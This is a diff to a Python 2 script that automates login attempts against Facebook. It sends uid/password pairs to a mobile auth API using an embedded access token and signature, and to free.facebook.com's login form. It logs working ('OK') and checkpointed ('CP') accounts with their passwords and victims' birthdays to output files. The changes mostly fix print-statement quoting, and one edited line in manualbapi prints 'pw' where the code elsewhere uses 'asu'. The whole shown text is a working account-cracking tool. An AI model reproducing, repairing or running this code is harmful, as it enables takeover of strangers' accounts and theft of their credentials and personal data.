@@ -320,7 +320,7 @@ def bapi():
 				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
 				respon = requests.get(api,params=param, headers=kontol)
 				if "session_key" in respon.text and "EAAA" in respon.text:
-					print '\r  \033[0;92m[RISHU-OK] \033[1;90m' +uid+ '|' + pw + '        '
+					print '\r  \033[0;92m[RISHU-OK] \033[1;92m' +uid+ '|' + pw + '        '
 					ok.append(uid+'|'+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write('  *--> '+str(uid)+'|'+str(pw)+'\n')
@@ -336,7 +336,7 @@ def bapi():
 						graph = b["birthday"]
 						month, day, year = graph.split("/")
 						month = bulan[month]
-						print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ pw + '|' \033[1;92m+ day + ' ' + month + ' ' + year + ' '
+						print'\r\x1b[1;91m[RISHU-CP] \033[1;90m' + uid + '|' + pw + '|\033[1;92m' + day + ' ' + month + ' ' + year + ' '
 						cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
 						save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
 						save.write('  * --> ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
@@ -345,7 +345,7 @@ def bapi():
 					except(KeyError, IOError):
 						graph = " "
 					except:pass
-					print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ pw + '                        '
+					print'\r\x1b[1;91m[RISHU-CP] \033[1;90m' + uid + '|' + pw + '                        '
 					cp.append(uid + '|' + pw)
 					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
 					save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
@@ -392,7 +392,7 @@ def manualbapi():
                 param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
                 respon = requests.get(api,params=param, headers=kontol)
                 if "session_key" in respon.text and "EAAA" in respon.text:
-                    print'\r\x1b[0;92m[RISHU-OK] ' \033[1;92m+ uid + '|' \033[1;92m+ asu + '        '
+                    print'\r\033[0;92m[RISHU-OK] \033[1;92m' +uid+ '|' + pw + '        '
                     ok.append(uid + '|' + asu)
                     save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                     save.write('  *--> ' + str(uid) + '|' + str(asu) + '\n')
@@ -401,7 +401,7 @@ def manualbapi():
                     continue
                     continue
                 if "www.facebook.com" in respon.json()["error_msg"]:
-                    print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ asu + '        '
+                    print'\r\x1b[1;91m[RISHU-CP] \033[1;90m' + uid + '|' + asu + '        '
                     cp.append(uid + '|' + asu)
                     save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                     save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
@@ -442,7 +442,7 @@ def freefb():
                 rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                 xo = rex.content
                 if 'free_logout_button' in xo or 'save-device' in xo:
-                    print'\r\x1b[1;92m[RISHU-OK] ' \033[1;92m+ uid + '|' \033[1;92m+ pw + '                                            '
+                    print'\r\x1b[1;92m[RISHU-OK] \033[1;92m' + uid + '|' + pw + '                                            '
                     ok.append(uid + '|' + pw)
                     save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                     save.write(' [OK] ' + str(uid) + '|' + str(pw) +                                   '\n')
@@ -458,7 +458,7 @@ def freefb():
                         graph = b["birthday"]
                         month, day, year = graph.split("/")
                         month = bulan[month]
-                        print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ pw + '|' \033[1;92m+ day + ' ' + month + ' ' + year + ' '
+                        print'\r\x1b[1;91m[RISHU-CP] \033[1;90m' + uid + '|' + pw + '|\033[1;92m' + day + ' ' + month + ' ' + year + ' '
                         cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                         save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                         save.write('  * --> ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
@@ -467,7 +467,7 @@ def freefb():
                     except(KeyError, IOError):
                         graph = " "
                     except:pass
-                    print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ pw + '                        '
+                    print'\r\x1b[1;91m[RISHU-CP] \033[1;90m' + uid + '|' + pw + '                        '
                     cp.append(uid + '|' + pw)
                     save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                     save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
@@ -510,7 +510,7 @@ def manualfreefb():
                 rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                 xo = rex.content
                 if 'free_logout_button' in xo or 'save-device' in xo:
-                    print'\r\x1b[1;92m[RISHU-OK] ' \033[1;92m+ uid + '|' \033[1;92m+ asu + '                          '
+                    print'\r\x1b[1;92m[RISHU-OK] \033[1;92m' + uid + '|' + asu + '                          '
                     ok.append(uid + '|' + asu)
                     save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                     save.write('  *--> ' + str(uid) + '|' + str(asu) +                         '\n')
@@ -526,7 +526,7 @@ def manualfreefb():
                         graph = b["birthday"]
                         month, day, year = graph.split("/")
                         month = bulan[month]
-                        print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ asu + '|' \033[1;92m+ day + ' ' + month + ' ' + year + ' '
+                        print'\r\x1b[1;91m[RISHU-CP] \033[1;90m' + uid + '|' + asu + '|\033[1;92m' + day + ' ' + month + ' ' + year + ' '
                         cp.append(uid + '|' + asu + '|' + day + ' ' + month + ' ' + year)
                         save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                         save.write('  * --> ' + str(uid) + '|' + str(asu) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
@@ -535,7 +535,7 @@ def manualfreefb():
                     except(KeyError, IOError):
                         graph = " "
                     except:pass
-                    print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ asu + '                        '
+                    print'\r\x1b[1;91m[RISHU-CP] \033[1;90m' + uid + '|' + asu + '                        '
                     cp.append(uid + '|' + asu)
                     save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                     save.write('  * --> ' + str(uid) + '|' + str(asu) +                        '\n')
